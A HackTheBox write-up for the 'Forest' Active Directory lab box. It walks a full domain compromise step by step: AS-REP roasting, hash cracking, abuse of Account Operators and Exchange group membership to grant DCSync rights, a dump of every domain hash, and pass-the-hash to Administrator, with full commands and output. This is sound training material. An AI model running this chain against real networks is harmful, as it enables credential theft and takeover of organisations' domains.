---
title: "HackTheBox - Forest"
published: true
---

| Field            | Details                                                                                                                                                                                 |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Windows                                                                                                                                                                                 |
| **Difficulty**   | Easy                                                                                                                                                                                    |
| **Release Date** | 2019-10-12                                                                                                                                                                              |
| **Pwned Date**   | 2026-07-10                                                                                                                                                                              |
| **Tags**         | `rpcclient` `as-rep roasting` `hashcat` `evil-winrm` `account operators group` `windows exchange` `dcsync` `dsacls` `impacket-secretsdump` `impacket-GetNPUsers` `pass-the-hash` `ntlm` |

## Summary

Forest is an easy Windows machine with a Domain Controller (DC) for a domain in which Exchange Server has been installed. After performing user enumeration, the password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes, compromising the system.

## Reconnaissance

### Port scan

Start with port scanning

```bash
python portscan.py --target <TARGET_IP>
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/portscan.py). If you want to run standard commands run

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49680,49681,49686,49696 -oN service_scan.txt <TARGET_IP>
```

In any case the output should look like this

```bash
--- Detected ports ---
port: 53; protocol: tcp; state: open
port: 88; protocol: tcp; state: open
port: 135; protocol: tcp; state: open
port: 139; protocol: tcp; state: open
port: 389; protocol: tcp; state: open
port: 445; protocol: tcp; state: open
port: 464; protocol: tcp; state: open
port: 593; protocol: tcp; state: open
port: 636; protocol: tcp; state: open
port: 3268; protocol: tcp; state: open
port: 3269; protocol: tcp; state: open
port: 5985; protocol: tcp; state: open
port: 9389; protocol: tcp; state: open
port: 47001; protocol: tcp; state: open
port: 49664; protocol: tcp; state: open
port: 49665; protocol: tcp; state: open
port: 49666; protocol: tcp; state: open
port: 49667; protocol: tcp; state: open
port: 49673; protocol: tcp; state: open
port: 49680; protocol: tcp; state: open
port: 49681; protocol: tcp; state: open
port: 49686; protocol: tcp; state: open
port: 49696; protocol: tcp; state: open

--- Detected services ---
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 04:15 -0400
Nmap scan report for 10.129.95.210
Host is up (0.030s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-08 08:22:04Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49696/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-07-08T01:22:55-07:00
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-08T08:22:53
|_  start_date: 2026-07-08T08:19:29

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.21 seconds
```

The target shows all the classic services of an Active Directory machine

### Users enumeration

Run rpcclient for users enumeration without credentials

```bash
rpcclient -U "" -N <TARGET_IP> -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

## Initial access

### AS-REP roasting

If a user account has pre-authentication disabled the KDC (Key Distribution Center) will respond without verifying the requester's identity. The AS-REP response contains data encrypted with that user's password hash, which can then be cracked offline.

Check all users for AS-REP roastability, you will find that the lucky one is **svc-alfresco**: a service account related to Alfresco Content Services.

```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip <TARGET_IP> -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:9a6da88e3e74af1c16601a6291dc2a8d$014906af655d844771c325d2f4406a71084c0bb6ea623a34866cefe83e48f7bed8a5d0ece544c4c1cac4a1f3d0b4599f953785a3e63a40034d9f1b84e2d76e728a4e4cee261a0f83502e167456a8ebcc71440246af292b4e40e801b075853e4fd8b84af9472e17c0e8b6b75ad4444a6ad7121953111f3c117fdfc287e01ead237efad8208f8d31c3c9357b3b4abbc6ed6a9658f0af9bbd4b0c1767b172c611d16e4ae8d3bb695c9eabcbab81ff36bfdc6cb2e92944a1a8cfe275b6d0183c390a6b62261118b4e1cf21624eae21f227c8d906b953d6c0db1f23a7f9f6b3be700c3402b2130a52
```

This command provided the password hash of the svc-alfresco user

### Hash cracking

Create a file 'hash.txt' with the discovered hash

```bash
cat hash.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:9a6da88e3e74af1c16601a6291dc2a8d$014906af655d844771c325d2f4406a71084c0bb6ea623a34866cefe83e48f7bed8a5d0ece544c4c1cac4a1f3d0b4599f953785a3e63a40034d9f1b84e2d76e728a4e4cee261a0f83502e167456a8ebcc71440246af292b4e40e801b075853e4fd8b84af9472e17c0e8b6b75ad4444a6ad7121953111f3c117fdfc287e01ead237efad8208f8d31c3c9357b3b4abbc6ed6a9658f0af9bbd4b0c1767b172c611d16e4ae8d3bb695c9eabcbab81ff36bfdc6cb2e92944a1a8cfe275b6d0183c390a6b62261118b4e1cf21624eae21f227c8d906b953d6c0db1f23a7f9f6b3be700c3402b2130a52
```

Use hashcat to crack the svc-alfresco hash

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt.gz
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 2948/5896 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (5898 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:9a6da88e3e74af1c16601a6291dc2a8d$014906af655d844771c325d2f4406a71084c0bb6ea623a34866cefe83e48f7bed8a5d0ece544c4c1cac4a1f3d0b4599f953785a3e63a40034d9f1b84e2d76e728a4e4cee261a0f83502e167456a8ebcc71440246af292b4e40e801b075853e4fd8b84af9472e17c0e8b6b75ad4444a6ad7121953111f3c117fdfc287e01ead237efad8208f8d31c3c9357b3b4abbc6ed6a9658f0af9bbd4b0c1767b172c611d16e4ae8d3bb695c9eabcbab81ff36bfdc6cb2e92944a1a8cfe275b6d0183c390a6b62261118b4e1cf21624eae21f227c8d906b953d6c0db1f23a7f9f6b3be700c3402b2130a52:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:9a6da88e3e74af...130a52
Time.Started.....: Wed Jul  8 07:06:37 2026 (3 secs)
Time.Estimated...: Wed Jul  8 07:06:40 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1722.0 kH/s (3.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4079616/14344385 (28.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: s9039554h -> s2704081

Started: Wed Jul  8 07:06:17 2026
Stopped: Wed Jul  8 07:06:41 2026
```

Hashcat, with the rockyou wordlist, is able to crack the hash.

The svc-alfresco password is **s3rvice**

Use the discovered password for winRM access

```bash
evil-winrm -i <TARGET_IP> -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

## Privilege escalation

Run the following enumeration command on the target

```powershell
whoami /all
```

```
USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
[snip]
```

The relevant piece of information from the command output is that the user is a member of the **Account Operators** group. This group allows to create/modify user accounts and is able to add users to non-protected groups.

The Account Operators membership can be leveraged for privilege escalation if a non-protected group with useful permissions (such as WriteDACL or GenericAll) can be found. In that case an attacker-controlled user can be added to that group and inherit the permissions.

### Groups permissions

You can check which groups are available with

```powershell
net group /domain

Group Accounts for \\

-------------------------------------------------------------------------------
*$D31000-NSEL5BRJ63V7
*Cloneable Domain Controllers
*Compliance Management
*Delegated Setup
*Discovery Management
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Exchange Servers
*Exchange Trusted Subsystem
*Exchange Windows Permissions
*ExchangeLegacyInterop
*Group Policy Creator Owners
*Help Desk
*Hygiene Management
*Key Admins
*Managed Availability Servers
*Organization Management
*Privileged IT Accounts
*Protected Users
*Public Folder Management
*Read-only Domain Controllers
*Recipient Management
*Records Management
*Schema Admins
*Security Administrator
*Security Reader
*Server Management
*Service Accounts
*test
*UM Management
*View-Only Organization Management
The command completed with one or more errors.
```

Focus on the Exchange Windows groups and check permissions

```powershell
Evil-WinRM PS C:\Users\svc-alfresco\Documents> dsacls "DC=htb,DC=local" | findstr /i "Exchange Windows Permissions"
Allow HTB\Exchange Windows Permissions
WRITE PERMISSIONS
[snip]
```

WRITE PERMISSIONS = WriteDacl = can modify ACLs on domain object

### DCSync attack

DCSync is the domain replication protocol, a legitimate feature allowing domain controllers to sync data (including password hashes). An account with replication privileges can impersonate a domain controller and pull all password hashes from the DC.

Create a new user (this leverages the Account Operators membership of svc-alfresco)

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user manualuser MyPassword123! /add /domain
The command completed successfully.
```

Add the created user to the **Exchange Windows Permissions** group (to leverage the WRITE PERMISSIONS) and the **Remote Management Users** (to be able to login remotely via winRM with the new user account)

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" manualuser /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" manualuser /add
The command completed successfully.
```

Connect remotely with new account

```bash
evil-winrm -i <TARGET_IP> -u manualuser -p MyPassword123!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\manualuser\Documents>
```

Run the following commands in the new user winrm session.

Leverage the new user's WRITE PERMISSIONS to grant it the replication privileges

```powershell
dsacls "DC=htb,DC=local" /G "htb\manualuser:CA;Replicating Directory Changes"
dsacls "DC=htb,DC=local" /G "htb\manualuser:CA;Replicating Directory Changes All"
```

Check if they were applied successfully

```powershell
dsacls "DC=htb,DC=local" | findstr /i "manualuser.*Replicating"
Allow HTB\manualuser                  Replicating Directory Changes
Allow HTB\manualuser                  Replicating Directory Changes All
```

On your attacking machine run the following command to pull the hashes

```bash
impacket-secretsdump 'htb.local/manualuser:MyPassword123!@<TARGET_IP>' -just-dc
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
manualuser:10101:aad3b435b51404eeaad3b435b51404ee:e1a0227f73dd648c1f7ab8c8bf3e9786:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:0633f7798247fa918a2e1305ab8b81e8:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
manualuser:aes256-cts-hmac-sha1-96:18b2aa01542adf7305512f3b91944b3d55b4d219499659035202da53b611b714
manualuser:aes128-cts-hmac-sha1-96:63b3e8b52f5979556afbaa8ee98551df
manualuser:des-cbc-md5:9237ba46b6755b04
FOREST$:aes256-cts-hmac-sha1-96:141dab4cf7236de4d80a903c6cf9f897f32947b187ec6d3beea5d5dce37c9b0f
FOREST$:aes128-cts-hmac-sha1-96:26a81cfba81ed91c1f7903d63ba3cdbc
FOREST$:des-cbc-md5:f7ef9d0725916876
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

### Pass-the-hash

The previous command provided a bunch of NTLM hashes.

In the Windows environment the NTLM hash is as good as the actual password. When authenticating:

- The server sends a random challenge
- The client encrypts the challenge with the user's password hash and send the encrypted data back to the server
- The server verifies the data performing the same encryption with the stored hash of the user

Therefore, having the hash is equivalent to having the actual password.

The tecnique of using the hash to authenticate is known as 'pass-the-hash'.

Escalate your privileges by accessing the Administrator account with its password hash.

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```powershell
whoami
htb\administrator
```

Got admin access.

## Lessons learned

The key takeaway of this box is to not trust blindly the tools' output.  
At first I approached the user enumeration step with ldapsearch, but that tool did not show the svc-alfresco user and my search for AS-REP roastable accounts came up empty.  
The turning point was using a different tool for user enumeration (rpcclient), that allowed me to discover the vulnerable svc-alfresco user.  
